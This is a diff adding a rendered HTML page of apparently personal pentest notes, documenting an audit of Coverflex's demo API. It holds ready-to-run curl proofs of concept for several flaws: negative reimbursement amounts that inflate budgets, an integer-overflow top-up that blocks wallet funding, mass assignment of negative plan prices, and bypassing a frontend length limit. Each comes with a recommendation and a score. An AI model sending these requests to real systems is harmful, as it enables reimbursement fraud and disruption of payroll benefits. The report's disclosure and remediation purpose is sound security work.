@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>Coverflex - Internship Ramblings</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Coverflex";
+        var mkdocs_page_input_path = "audits/PoC.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <script src="../../js/jquery-3.6.0.min.js" defer></script>
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+      <script>hljs.initHighlightingOnLoad();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> Internship Ramblings
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Home</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">OWASP</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../OWASP/api/">Api</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">SAML</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../SAML/saml_notes/">SAML</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Audits</span></p>
+              <ul class="current">
+                  <li class="toctree-l1 current"><a class="reference internal current" href="./">Coverflex</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#poc-security-misconfiguration-at-budget-reinbursement">PoC Security Misconfiguration at Budget reinbursement.</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#description">Description</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#instructions">Instructions</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#recommendations">Recommendations</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#score">Score:</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#poc-dos-at-employees-wallet-top-up-via-integer-overflow">PoC DoS at employee's wallet top up via integer overflow</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#description_1">Description</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#instructions_1">Instructions</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#recommendation">Recommendation</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#score_1">Score:</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#poc-wallet-monthlyyearly-renewal-price-change-via-mass-assignment">PoC wallet monthly/yearly renewal price change via mass assignment</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#description_2">Description</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#intructions">Intructions</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#recommendations_1">Recommendations</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#score_2">Score:</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#poc-4">PoC 4</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#description_3">Description</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#instructions_2">Instructions</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#poc-arbitrary-unpriveleged-user-can-change-its-own-attributes-when-only-manager-should-by-communicating-with-the-api-directly">PoC Arbitrary unpriveleged user can change its own attributes when only manager should, by communicating with the API directly.</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#instructions_3">Instructions</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#recomendations">Recomendations</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#score_3">Score:</a>
+    </li>
+        </ul>
+    </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../neurowave/">NEUROWAVE, LDA</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Ctfs</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="#">Capital ctf</a>
+    <ul>
+                <li class="toctree-l2"><a class="reference internal" href="../../ctfs/capital-ctf/">Index</a>
+                </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="#">Dvga</a>
+    <ul>
+                <li class="toctree-l2"><a class="reference internal" href="../../ctfs/dvga/dvga/">Dvga</a>
+                </li>
+    </ul>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Dvwss</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dvwss/notes/">Notes</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Goatlin</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../goatlin/notes/">Goatlin Notes</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Notes</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../notes/api_types/">Api types</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../notes/http2/">Http2</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../notes/nosqli/">NoSQL</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../notes/sql/">SQL - Structured Query Language</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Portswigger</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../portswigger/labs/">PortSwigger labs</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Quiz</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../quiz/SecurityChampion/">QUIZ</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Research</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../research/angular_notes/">Angular</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../research/dangling%20markup/">Evading CSP with DOM-based dangling markup (PortSwigger) - An alternative approach</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="#">Subdomain takeover</a>
+    <ul>
+                <li class="toctree-l2"><a class="reference internal" href="../../research/subdomain-takeover/">Index</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="#">Findings</a>
+    <ul>
+                <li class="toctree-l3"><a class="reference internal" href="../../research/subdomain-takeover/findings/security-advisory/">Security Advisory</a>
+                </li>
+    </ul>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="#">Src</a>
+    <ul>
+                <li class="toctree-l3"><a class="reference internal" href="#">Commands</a>
+    <ul>
+                <li class="toctree-l4"><a class="reference internal" href="../../research/subdomain-takeover/src/commands/commands/">Commands</a>
+                </li>
+    </ul>
+                </li>
+                <li class="toctree-l3"><a class="reference internal" href="#">Script</a>
+    <ul>
+                <li class="toctree-l4"><a class="reference internal" href="../../research/subdomain-takeover/src/script/">Index</a>
+                </li>
+    </ul>
+                </li>
+    </ul>
+                </li>
+    </ul>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Techniques</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../techniques/interesting/">Techniques created by me (or not) uncommon in the wild</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../techniques/methodology/">A methodological checklist to logically deduce the steps needed to pentest a web app.</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../techniques/triggers/">Errors based/behaviour inferer</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Tools</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../tools/notes/">Notes</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">Internship Ramblings</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" alt="Docs"></a> &raquo;</li>
+          <li>Audits &raquo;</li>
+      <li>Coverflex</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="coverflex">Coverflex</h1>
+<h2 id="poc-security-misconfiguration-at-budget-reinbursement">PoC Security Misconfiguration at Budget reinbursement.</h2>
+<h3 id="description">Description</h3>
+<p>This vulnerability arises when a manager sets a budget to an employee. Whilst the unprivileged user refunds that budget via: <code>https://my-demo.coverflex.com/budgets/reimbursement/new</code>, if he communicates directly with the API, he is able to give a negative <code>amount</code>. When a negative value is given and subtracted from the budget, the math becomes: <code>budget = budget - (-amount) = budget + amount</code>, thus the budget is increased. Following this, the employee can then use the accumulated budget to ask for a larger refund than what the budget's design allows.</p>
+<h3 id="instructions">Instructions</h3>
+<p>Login with a manager.</p>
+<p>In the manager dashboard go to budgets and add a new budget. Give it a value of 500€, assign it to the employee you logged in as.</p>
+<p>Login with a employee account in the website. Also substitute the [EMAIL] and [PASSWORD] fields in this curl command and run it to save the <code>Authorization: Bearer</code> token:</p>
+<p><code>curl -i -s -k -X $'POST' -H $'Host: demo-menhir-api.coverflex.com' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'Content-Length: 78' -H $'Origin: https://people-demo.coverflex.com' -H $'Dnt: 1' -H $'Referer: https://people-demo.coverflex.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' --data-binary $'{\"email\":\"[EMAIL]\",\"password\":\"[PASSWORD]\"}' $'https://demo-menhir-api.coverflex.com/api/business/sessions'</code></p>
+<p>In the employee dashboard, go to budgets and click the budget you just created. Notice the value of 500€. Save the uuid present in the url, you'll need it. </p>
+<p>Use the following curl commands, substitute the [TOKEN] with the bearer token returned from previous command and save the order_id that returns from the request: </p>
+<p><code>curl -i -s -k -X $'POST' -H $'Authorization: Bearer [Bearer TOKEN]' -H $'X-Coverflex-Version: 1.0.0' -H $'X-Coverflex-Channel: web' -H $'X-Coverflex-Language: pt-PT' -H $'Content-Type: multipart/form-data; boundary=---------------------------355770127421593315121724562023' -H $'Content-Length: 232' -H $'Origin: https://my-demo.coverflex.com' -H $'Dnt: 1' -H $'Referer: https://my-demo.coverflex.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' --data-binary $'-----------------------------355770127421593315121724562023\x0d\x0aContent-Disposition: form-data; name=\"files[]\"; filename=\"invoice.jpg\"\x0d\x0aContent-Type: image/jpeg\x0d\x0a\x0d\x0atest\x0d\x0a\x0d\x0a-----------------------------355770127421593315121724562023--\x0d\x0a' $'https://demo-menhir-api.coverflex.com/api/employee/orders/reimbursements/budgets/files'</code></p>
+<p>Use the following curl command, substituting [TOKEN] with the login token, [BUDGET_EMPLOYEE_ID] with the uuid saved, and [BUDGET_ID] with the order_id gotten previously.</p>
+<p><code>curl -v -L -X PUT -H "Authorization: Bearer [TOKEN] -H "Content-Type: application/json" -d '{"amount":{"amount":-10000,"currency":"EUR"},"purchased_at":"2022-09-01","confirm":true,"description":"123","budget_employee_id":"[BUDGET_EMPLOYEE_ID]"}' https://demo-menhir-api.coverflex.com/api/employee/orders/reimbursements/budgets/[BUDGET_ID]</code></p>
+<p>Back to the employee dashboard, notice the budget is higher than the limit set by you.</p>
+<p>Click the budget again. Issue a reinburssment for the totality of the new budget value. (600€).</p>
+<p>Go to the manager panel, wallet, budget approvals, review the budget you just asked to be reinburssed and approve it.</p>
+<p>It is sucessful, the user got reinbursed for more than the value limited by the budget and the funds were transfered to his account.</p>
+<h3 id="recommendations">Recommendations</h3>
+<p>Do not allow to input negative numbers or 0. Check if the number is &lt;= 0, if it is, discard it. - OWASP API TOP 7 - Security Misconfiguration</p>
+<h3 id="score">Score:</h3>
+<p>Medium</p>
+<h2 id="poc-dos-at-employees-wallet-top-up-via-integer-overflow">PoC DoS at employee's wallet top up via integer overflow</h2>
+<h3 id="description_1">Description</h3>
+<p>In the wallet pop up section lays the ability to specify the amount to pop up. If we interact with the api directly, we can use an integer overflow to pop a negative value which will block all other wallet top ups.</p>
+<h3 id="instructions_1">Instructions</h3>
+<p>Login via curl, replacing the necessary values: Save your authorization token.</p>
+<p><code>curl -i -s -k -X $'POST' -H $'Host: demo-menhir-api.coverflex.com' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'Content-Length: 78' -H $'Origin: https://people-demo.coverflex.com' -H $'Dnt: 1' -H $'Referer: https://people-demo.coverflex.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' --data-binary $'{\"email\":\"[EMAIL]\",\"password\":\"[PASSWORD]\"}' $'https://demo-menhir-api.coverflex.com/api/business/sessions'</code></p>
+<p>Go to your api and grab a employee id.</p>
+<p>Use the following curl request replacing [TOKEN] with your bearer token and [EMPLOYEE_ID] with your employee_id.</p>
+<p><code>curl -i -s -k -X $'POST' -H $'Content-Length: 3851' -H $'Sec-Ch-Ua: \"Not;A=Brand\";v=\"99\", \"Chromium\";v=\"106\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Authorization: Bearer [TOKEN]' -H $'X-Coverflex-Language: en-GB' -H $'Content-Type: application/x-www-form-urlencoded' -H $'X-Coverflex-Company: f0000be2-0a46-4620-8cc1-2fd44db97b01' -H $'Accept: application/json, text/plain, */*' -H $'Sec-Ch-Ua-Platform: \"Linux\"' -H $'Origin: https://people-demo.coverflex.com' -H $'Sec-Fetch-Site: same-site' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://people-demo.coverflex.com/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' --data-binary $'topups%5b0%5d%5bemployee_id%5d=397c18a1-f438-4ef0-8959-2391a095de40&amp;topups%5b0%5d%5bpocket_type%5d=meals&amp;topups%5b0%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b0%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b1%5d%5bemployee_id%5d=397c18a1-f438-4ef0-8959-2391a095de40&amp;topups%5b1%5d%5bpocket_type%5d=benefits&amp;topups%5b1%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b1%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b2%5d%5bemployee_id%5d=e1976d93-ca42-4b6e-b4e8-78be88522455&amp;topups%5b2%5d%5bpocket_type%5d=meals&amp;topups%5b2%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b2%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b3%5d%5bemployee_id%5d=e1976d93-ca42-4b6e-b4e8-78be88522455&amp;topups%5b3%5d%5bpocket_type%5d=benefits&amp;topups%5b3%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b3%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b4%5d%5bemployee_id%5d=2c2d13d7-e0fb-40b5-a39b-39c697958d49&amp;topups%5b4%5d%5bpocket_type%5d=meals&amp;topups%5b4%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b4%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b5%5d%5bemployee_id%5d=2c2d13d7-e0fb-40b5-a39b-39c697958d49&amp;topups%5b5%5d%5bpocket_type%5d=benefits&amp;topups%5b5%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b5%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b6%5d%5bemployee_id%5d=563b72d6-538b-4aa5-86cd-af7914f9fea2&amp;topups%5b6%5d%5bpocket_type%5d=meals&amp;topups%5b6%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b6%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b7%5d%5bemployee_id%5d=563b72d6-538b-4aa5-86cd-af7914f9fea2&amp;topups%5b7%5d%5bpocket_type%5d=benefits&amp;topups%5b7%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b7%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b8%5d%5bemployee_id%5d=52b9faf4-4507-425e-9dff-3debe6b0fbed&amp;topups%5b8%5d%5bpocket_type%5d=meals&amp;topups%5b8%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b8%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b9%5d%5bemployee_id%5d=52b9faf4-4507-425e-9dff-3debe6b0fbed&amp;topups%5b9%5d%5bpocket_type%5d=benefits&amp;topups%5b9%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b9%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b10%5d%5bemployee_id%5d=909ba645-22d9-4b61-b21f-4180ba4020c5&amp;topups%5b10%5d%5bpocket_type%5d=meals&amp;topups%5b10%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b10%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b11%5d%5bemployee_id%5d=909ba645-22d9-4b61-b21f-4180ba4020c5&amp;topups%5b11%5d%5bpocket_type%5d=benefits&amp;topups%5b11%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b11%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b12%5d%5bemployee_id%5d=4d046cce-28e4-4a0a-be87-2adf0ddc6061&amp;topups%5b12%5d%5bpocket_type%5d=meals&amp;topups%5b12%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b12%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b13%5d%5bemployee_id%5d=4d046cce-28e4-4a0a-be87-2adf0ddc6061&amp;topups%5b13%5d%5bpocket_type%5d=benefits&amp;topups%5b13%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b13%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b14%5d%5bemployee_id%5d=e519d71c-5dad-4528-aa95-977f20d5f43f&amp;topups%5b14%5d%5bpocket_type%5d=meals&amp;topups%5b14%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b14%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b15%5d%5bemployee_id%5d=e519d71c-5dad-4528-aa95-977f20d5f43f&amp;topups%5b15%5d%5bpocket_type%5d=benefits&amp;topups%5b15%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b15%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b16%5d%5bemployee_id%5d=e47ba50c-4f1e-4bc2-8225-4e3221f53bae&amp;topups%5b16%5d%5bpocket_type%5d=meals&amp;topups%5b16%5d%5bamount%5d%5bamount%5d=11111111111111111111111111111111111111111111&amp;topups%5b16%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b17%5d%5bemployee_id%5d=e47ba50c-4f1e-4bc2-8225-4e3221f53bae&amp;topups%5b17%5d%5bpocket_type%5d=benefits&amp;topups%5b17%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b17%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b18%5d%5bemployee_id%5d=3502465b-c288-46a5-af10-ad1a42712ee7&amp;topups%5b18%5d%5bpocket_type%5d=meals&amp;topups%5b18%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b18%5d%5bamount%5d%5bcurrency%5d=EUR&amp;topups%5b19%5d%5bemployee_id%5d=[EMPLOYEE_ID]&amp;toppups%5b19%5d%5bpocket_type%5d=benefits&amp;topups%5b19%5d%5bamount%5d%5bamount%5d=0&amp;topups%5b19%5d%5bamount%5d%5bcurrency%5d=EUR' $'https://demo-menhir-api.coverflex.com/api/business/wallet/topups'</code></p>
+<h3 id="recommendation">Recommendation</h3>
+<p>Disallow values bigger/equal to your current data type's numeric limit. - OWASP API TOP 4 - Lack of Resources and Rate-Limiting</p>
+<h3 id="score_1">Score:</h3>
+<p>Low</p>
+<h2 id="poc-wallet-monthlyyearly-renewal-price-change-via-mass-assignment">PoC wallet monthly/yearly renewal price change via mass assignment</h2>
+<h3 id="description_2">Description</h3>
+<p>This occurs because the backend has an object which uses the api to set its own properties. A manager can use api to set the wallet's plan monthly/weekly payment to any arbitrary number, potentially leading him to pay nothing.</p>
+<h3 id="intructions">Intructions</h3>
+<p>Login via curl with the following command, replacing the necessary values, and save the bearer token: </p>
+<p><code>curl -i -s -k -X $'POST' -H $'Host: demo-menhir-api.coverflex.com' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'Content-Length: 78' -H $'Origin: https://people-demo.coverflex.com' -H $'Dnt: 1' -H $'Referer: https://people-demo.coverflex.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' --data-binary $'{\"email\":\"[EMAIL]\",\"password\":\"[PASSWORD]\"}' $'https://demo-menhir-api.coverflex.com/api/business/sessions'</code></p>
+<p>Get your companie's uuid.</p>
+<p>Send a curl request like the following, replacing the necessary values</p>
+<p><code>curl -i -s -k -X $'PATCH'-H $'Authorization: Bearer [TOKEN]' -H $'X-Coverflex-Language: en-GB' -H $'X-Coverflex-Company: f0000be2-0a46-4620-8cc1-2fd44db97b01' -H $'Content-Type: application/json' -H $'Accept: application/json, text/plain, */*' -H $'Sec-Ch-Ua-Platform: \"Linux\"' -H $'Origin: https://people-demo.coverflex.com' -H $'Sec-Fetch-Site: same-site' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://people-demo.coverflex.com/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9'--data-binary $'{\"company\":{\x0d\x0a\"wallet_plan\":{\x0d\x0a\"yearly_price\":{\x0d\x0a\"amount\":-1,\x0d\x0a\"currency\":\"EUR\"},\x0d\x0a\"monthly_price\":{\x0d\x0a\"amount\":-1,\x0d\x0a\"currency\":\"EUR\"}}\x0d\x0a}\x0d\x0a}' $'https://demo-menhir-api.coverflex.com/api/business/company/[COMPANY_UUID]'</code></p>
+<h3 id="recommendations_1">Recommendations</h3>
+<p>Do not use the api to set sensitive object attributes. - OWASP API TOP 6 - Mass Assignment</p>
+<h3 id="score_2">Score:</h3>
+<p>Informative</p>
+<h2 id="poc-4">PoC 4</h2>
+<h3 id="description_3">Description</h3>
+<p>An attacker isn't forced to use the UX to "talk" to the app. He can use the api directly, hence bypassing frontend restrictions. In this case, an attacker isn't forced to the 1200 characters allowed in the budget description section, he can use many more.</p>
+<h3 id="instructions_2">Instructions</h3>
+<p><code>curl -i -s -k -X $'POST' -H $'Host: demo-menhir-api.coverflex.com' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'Content-Length: 78' -H $'Origin: https://people-demo.coverflex.com' -H $'Dnt: 1' -H $'Referer: https://people-demo.coverflex.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' --data-binary $'{\"email\":\"[EMAIL]\",\"password\":\"[PASSWORD]\"}' $'https://demo-menhir-api.coverflex.com/api/business/sessions'</code></p>
+<p>Replace the bearer token with yours and send the following curl request to create a budget. </p>
+<p><code>curl -i -s -k -X $'POST'-H $'Host: demo-menhir-api.coverflex.com' -H $'Content-Length: 215' -H $'Sec-Ch-Ua: \"Not;A=Brand\";v=\"99\", \"Chromium\";v=\"106\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Authorization: Bearer [TOKEN]' -H $'X-Coverflex-Language: en-GB' -H $'X-Coverflex-Company: f0000be2-0a46-4620-8cc1-2fd44db97b01' -H $'Content-Type: application/json' -H $'Accept: application/json, text/plain, */*' -H $'Sec-Ch-Ua-Platform: \"Linux\"' -H $'Origin: https://people-demo.coverflex.com' -H $'Sec-Fetch-Site: same-site' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://people-demo.coverflex.com/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9'--data-binary $'{\"budget\":{\"logo\":\"default\",\"name\":[{\"language\":\"pt-PT\",\"value\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa